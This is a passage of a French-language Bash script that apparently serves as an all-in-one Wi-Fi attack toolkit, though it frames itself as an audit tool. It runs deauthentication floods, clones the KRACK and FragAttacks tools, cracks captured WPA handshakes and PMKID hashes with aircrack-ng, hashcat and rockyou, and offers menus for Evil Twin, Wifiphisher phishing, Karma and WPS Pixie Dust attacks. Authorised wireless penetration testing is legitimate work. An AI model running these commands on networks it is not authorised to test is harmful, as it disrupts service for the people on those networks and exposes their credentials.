    fi

    echo ""
    info "Analyse complète dans : $file"
    pause
}

stress_test_deauth() {
    ensure_monitor_active || return
    ensure_target_selected || return
    draw_header
    echo -e "${BOLD}--- STRESS TEST (DEAUTH FLOOD) ---${NC}\n"
    warn "⚠️ Test de résistance aux attaques de déauthentification"

    read -rp "Durée (s) [défaut: 30] : " dur
    dur="${dur:-30}"

    log "Flood de déauth sur $TARGET_BSSID pendant ${dur}s..."
    info "Testez si le réseau résiste (ex: 802.11w PMF activé)."

    timeout "$dur" aireplay-ng --deauth 0 -a "$TARGET_BSSID" "$MONIFACE" 2>&1 | tee "$LOGDIR/stress.log"

    echo ""
    info "Analyse : si les clients ne se déconnectent pas, le PMF (802.11w) est actif."
    pause
}

krack_test() {
    draw_header
    echo -e "${BOLD}--- TEST VULNÉRABILITÉ KRACK ---${NC}\n"
    warn "⚠️ Nécessite l'outil KRACK de Vanhoefm"

    if ! command -v python3 &>/dev/null; then
        err "Python3 requis."; pause; return
    fi

    local krack_dir="/opt/krackattacks-test"
    if [[ ! -d "$krack_dir" ]]; then
        warn "Outil KRACK non trouvé."
        read -rp "Cloner depuis GitHub ? (o/n) : " r
        if [[ "$r" =~ ^[oOyY]$ ]]; then
            git clone https://github.com/krackattacks-test/krackattacks-test.git "$krack_dir" 2>/dev/null || {
                err "Clonage échoué."; pause; return
            }
            cd "$krack_dir" && pip3 install -r requirements.txt 2>/dev/null
            cd - > /dev/null
        else
            return
        fi
    fi

    ensure_target_selected || return
    log "Lancement test KRACK sur $TARGET_ESSID..."
    info "Suivez les instructions de l'outil..."
    cd "$krack_dir"
    python3 krackAttack/krack_all_zero.py -h 2>/dev/null || info "Utilisez les scripts dans $krack_dir"
    cd - > /dev/null
    pause
}

fragattacks_test() {
    draw_header
    echo -e "${BOLD}--- TEST FRAGATTACKS (802.11 fragmentation) ---${NC}\n"

    local tool_dir="/opt/fragattacks"
    if [[ ! -d "$tool_dir" ]]; then
        warn "Outil FragAttacks non trouvé."
        read -rp "Cloner depuis GitHub ? (o/n) : " r
        if [[ "$r" =~ ^[oOyY]$ ]]; then
            git clone https://github.com/vanhoefm/fragattacks.git "$tool_dir" 2>/dev/null || {
                err "Clonage échoué."; pause; return
            }
        else
            return
        fi
    fi

    info "Outil disponible dans : $tool_dir"
    info "Voir https://www.fragattacks.com pour la doc."
    info "Lancement interactif..."
    cd "$tool_dir" && python3 fragattack.py -h 2>/dev/null || bash
    cd - > /dev/null
    pause
}

# ==============================
# CRACKING
# ==============================
select_cap_file() {
    local caps=()
    while IFS= read -r f; do
        [[ -f "$f" ]] && caps+=("$f")
    done < <(find "$HOME/wifi_audit_logs" -name "*.cap" 2>/dev/null | head -20)

    [[ -n "$LAST_CAPFILE" && -f "$LAST_CAPFILE" ]] && {
        [[ ! " ${caps[*]} " =~ " ${LAST_CAPFILE} " ]] && caps=("$LAST_CAPFILE" "${caps[@]}")
    }

    echo -e "${BOLD}Fichiers .cap disponibles :${NC}"
    for i in "${!caps[@]}"; do
        echo "  [$((i + 1))] ${caps[$i]}"
    done
    echo "  [m] Entrer manuellement"
    echo "  [0] Annuler"
    read -rp "Choix : " p

    if [[ "$p" =~ ^[0-9]+$ ]] && (( p >= 1 && p <= ${#caps[@]} )); then
        SELECTED_CAP="${caps[$((p - 1))]}"
    elif [[ "$p" == "m" ]]; then
        read -rp "Chemin .cap : " SELECTED_CAP
    else
        SELECTED_CAP=""
    fi
}

select_wordlist() {
    local lists=()
    local common=(
        "/usr/share/wordlists/rockyou.txt"
        "/usr/share/wordlists/rockyou.txt.gz"
        "/usr/share/wordlists/fasttrack.txt"
        "/usr/share/john/password.lst"
        "/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz"
    )

    while IFS= read -r f; do
        [[ -f "$f" ]] && lists+=("$f")
    done < <(find /usr /opt "$HOME" -name "rockyou*" -o -name "*.lst" -o -name "*password*.txt" 2>/dev/null | head -10)

    for wl in "${common[@]}"; do
        [[ -f "$wl" && ! " ${lists[*]} " =~ " ${wl} " ]] && lists+=("$wl")
    done

    echo -e "${BOLD}Wordlists détectées :${NC}"
    for i in "${!lists[@]}"; do
        echo "  [$((i + 1))] ${lists[$i]}"
    done
    echo "  [m] Manuel | [d] Télécharger rockyou.txt | [0] Annuler"
    read -rp "Choix : " p

    if [[ "$p" =~ ^[0-9]+$ ]] && (( p >= 1 && p <= ${#lists[@]} )); then
        SELECTED_WL="${lists[$((p - 1))]}"
        if [[ "$SELECTED_WL" == *.gz ]]; then
            local dec="${SELECTED_WL%.gz}"
            if [[ ! -f "$dec" ]]; then
                log "Décompression..."
                gunzip -k "$SELECTED_WL" 2>/dev/null || gzip -d -c "$SELECTED_WL" > "$dec"
            fi
            SELECTED_WL="$dec"
        fi
    elif [[ "$p" == "m" ]]; then
        read -rp "Chemin : " SELECTED_WL
    elif [[ "$p" == "d" ]]; then
        local target="/usr/share/wordlists/rockyou.txt.gz"
        mkdir -p /usr/share/wordlists
        log "Téléchargement rockyou.txt..."
        curl -L -o "$target" https://github.com/brannondorffy/naive-hashcat/releases/download/data/rockyou.txt 2>/dev/null
        [[ -f "$target" ]] && gunzip -k "$target" 2>/dev/null
        SELECTED_WL="/usr/share/wordlists/rockyou.txt"
    else
        SELECTED_WL=""
    fi
}

crack_handshake() {
    draw_header
    echo -e "${BOLD}--- CRACKING HANDSHAKE ---${NC}\n"

    select_cap_file
    [[ -z "$SELECTED_CAP" || ! -f "$SELECTED_CAP" ]] && { err "Fichier invalide."; pause; return; }

    echo ""
    select_wordlist
    [[ -z "$SELECTED_WL" || ! -f "$SELECTED_WL" ]] && { err "Wordlist invalide."; pause; return; }

    log "Cracking avec aircrack-ng..."
    echo "  Capture : $SELECTED_CAP"
    echo "  Wordlist: $SELECTED_WL"
    if [[ -n "$TARGET_BSSID" ]]; then
        aircrack-ng -w "$SELECTED_WL" -b "$TARGET_BSSID" "$SELECTED_CAP" | tee "$LOGDIR/crack.log"
    else
        aircrack-ng -w "$SELECTED_WL" "$SELECTED_CAP" | tee "$LOGDIR/crack.log"
    fi
    pause
}

crack_pmkid() {
    draw_header
    echo -e "${BOLD}--- CRACKING PMKID (Hashcat/Aircrack) ---${NC}\n"

    mapfile -t hashes < <(find "$HOME/wifi_audit_logs" -name "*.22000" 2>/dev/null)
    if [[ ${#hashes[@]} -eq 0 ]]; then
        err "Aucun fichier .22000 trouvé."; pause; return
    fi

    for i in "${!hashes[@]}"; do
        echo "  [$((i + 1))] ${hashes[$i]}"
    done
    read -rp "Choix : " h
    [[ ! "$h" =~ ^[0-9]+$ ]] && return
    local hf="${hashes[$((h - 1))]}"

    select_wordlist
    [[ -z "$SELECTED_WL" ]] && return

    if command -v hashcat &>/dev/null; then
        ok "Hashcat détecté (GPU)..."
        hashcat -m 22000 -a 0 "$hf" "$SELECTED_WL" --force 2>&1 | tee "$LOGDIR/pmkid_crack.log"
    else
        warn "Hashcat absent, fallback aircrack-ng (CPU)..."
        aircrack-ng -w "$SELECTED_WL" "$hf" 2>&1 | tee "$LOGDIR/pmkid_crack.log"
    fi
    pause
}

verify_handshake() {
    draw_header
    select_cap_file
    [[ -z "$SELECTED_CAP" ]] && return
    aircrack-ng "$SELECTED_CAP"
    pause
}

# ==============================
# MENUS
# ==============================
submenu_interfaces() {
    while true; do
        draw_header
        echo -e "${BOLD}=== INTERFACE & MONITOR ===${NC}\n"
        echo "  [1] Sélectionner interface WiFi"
        echo "  [2] Activer mode monitor"
        echo "  [3] Désactiver mode monitor"
        echo "  [4] Changer adresse MAC"
        echo "  [5] Test d'injection de paquets"
        echo "  [6] Sélectionner 2ème interface (Evil Twin)"
        echo "  [0] Retour"
        read -rp "Choix : " o
        case "$o" in
            1) select_interface ;; 2) enable_monitor ;; 3) disable_monitor ;;
            4) change_mac ;; 5) test_injection ;; 6) select_second_interface ;;
            0) break ;; *) err "Invalide."; pause ;;
        esac
    done
}

submenu_attacks() {
    while true; do
        draw_header
        echo -e "${BOLD}=== CAPTURES CLASSIQUES ===${NC}\n"
        echo "  [1] Handshake WPA/WPA2"
        echo "  [2] PMKID (hcxdumptool)"
        echo "  [3] WPS Pixie Dust"
        echo "  [4] Wifite automatisé"
        echo "  [0] Retour"
        read -rp "Choix : " o
        case "$o" in
            1) capture_handshake ;; 2) capture_pmkid ;; 3) wps_attack ;;
            4) run_wifite ;; 0) break ;; *) err "Invalide."; pause ;;
        esac
    done
}

submenu_advanced() {
    while true; do
        draw_header
        echo -e "${BOLD}${RED}=== ATTAQUES AVANCÉES ===${NC}\n"
        echo "  [1] Evil Twin classique (Airbase-ng + Portal)"
        echo "  [2] Evil Twin Wifiphisher (Phishing auto)"
        echo "  [3] Karma Attack (MANA)"
        echo "  [4] Détection Rogue AP"
        echo "  [5] Stress Test (Deauth flood)"
        echo "  [0] Retour"
        read -rp "Choix : " o
        case "$o" in
            1) evil_twin_classic ;; 2) evil_twin_wifiphisher ;; 3) karma_attack ;;
            4) detect_rogue_ap ;; 5) stress_test_deauth ;; 0) break ;;
            *) err "Invalide."; pause ;;
        esac
    done
}

submenu_robustness() {
    while true; do
        draw_header
        echo -e "${BOLD}=== TESTS DE ROBUSTESSE ===${NC}\n"
        echo "  [1] Test KRACK (Key Reinstallation)"
        echo "  [2] Test FragAttacks (Fragmentation)"
        echo "  [3] Test injection de paquets"
        echo "  [4] Vérifier PMF (802.11w)"
        echo "  [0] Retour"
        read -rp "Choix : " o
        case "$o" in
            1) krack_test ;; 2) fragattacks_test ;; 3) test_injection ;;
            4) stress_test_deauth ;; 0) break ;; *) err "Invalide."; pause ;;
        esac
    done
}

submenu_cracking() {
    while true; do
        draw_header
        echo -e "${BOLD}=== CRACKING & ANALYSE ===${NC}\n"
        echo "  [1] Vérifier handshake dans .cap"
        echo "  [2] Cracker handshake WPA (aircrack-ng)"
        echo "  [3] Cracker PMKID (hashcat / aircrack)"
        echo "  [0] Retour"
        read -rp "Choix : " o
        case "$o" in
            1) verify_handshake ;; 2) crack_handshake ;; 3) crack_pmkid ;;
            0) break ;; *) err "Invalide."; pause ;;
        esac
    done
}

# ==============================
# CLEANUP GLOBAL
# ==============================
cleanup_on_exit() {
    echo -e "\n${YELLOW}[*] Nettoyage final...${NC}"

    pkill -f "airodump-ng" 2>/dev/null || true
    pkill -f "aireplay-ng" 2>/dev/null || true
    pkill -f "reaver" 2>/dev/null || true
    pkill -f "airbase-ng" 2>/dev/null || true
    pkill -f "hcxdumptool" 2>/dev/null || true
    [[ -n "$EVIL_TWIN_PID" ]] && kill "$EVIL_TWIN_PID" 2>/dev/null || true

    if [[ -n "$MONIFACE" ]]; then
        airmon-ng stop "$MONIFACE" >/dev/null 2>&1 || true
        [[ -n "$IFACE" ]] && {
            ip link set "$IFACE" down 2>/dev/null || true
            iw "$IFACE" set type managed 2>/dev/null || true
            ip link set "$IFACE" up 2>/dev/null || true
        }
    fi

    systemctl restart NetworkManager 2>/dev/null || service NetworkManager restart 2>/dev/null || true
    systemctl restart wpa_supplicant 2>/dev/null || true
    iptables -t nat -F 2>/dev/null || true
    echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true

    ok "Système restauré. Logs : $LOGDIR"
}

trap cleanup_on_exit EXIT INT TERM

# ==============================
# MENU PRINCIPAL
# ==============================
main_menu() {
    while true; do
        draw_header
        echo -e "${BOLD}=== MENU PRINCIPAL ===${NC}\n"
        echo -e "  [1] 📡 Gestion Interface & Monitor"
        echo -e "  [2] 🔍 Scanner & Sélectionner une Cible"
        echo -e "  [3] 🎯 Captures Classiques (Handshake/PMKID/WPS)"
        echo -e "  [4] 👻 ${RED}Attaques Avancées (Evil Twin/Karma)${NC}"
        echo -e "  [5] 🔑 Cracking & Analyse"
        echo -e "  [6] 🛡️ Tests de Robustesse (KRACK/FragAttacks)"
        echo -e "  [7] 📦 Vérifier / Installer dépendances"
        echo -e "  [8] 🔄 Restaurer le réseau"
        echo -e "  [9] ⬆️  ${GREEN}Mettre à jour le script depuis GitHub${NC}"
        echo -e "  [0] 🚪 Quitter"
        echo ""
        read -rp "Sélection [0-9] : " m

        case "$m" in
            1) submenu_interfaces ;;
            2) scan_and_select_target ;;
            3) submenu_attacks ;;
            4) submenu_advanced ;;
            5) submenu_cracking ;;
            6) submenu_robustness ;;
            7) check_deps ;;
            8) disable_monitor ;;
            9) check_update ;;
            0|q|Q)
                if [[ -n "$MONIFACE" ]]; then
                    read -rp "Désactiver mode monitor avant de quitter ? (o/n) : " s
                    [[ "$s" =~ ^[oOyY]$ ]] && disable_monitor
                fi
                ok "Au revoir. Logs : $LOGDIR"
                exit 0
                ;;
            *) err "Invalide."; sleep 1 ;;
        esac
    done
}

# ==============================
# POINT D'ENTRÉE
# ==============================
check_root
check_consent
load_session
main_menu
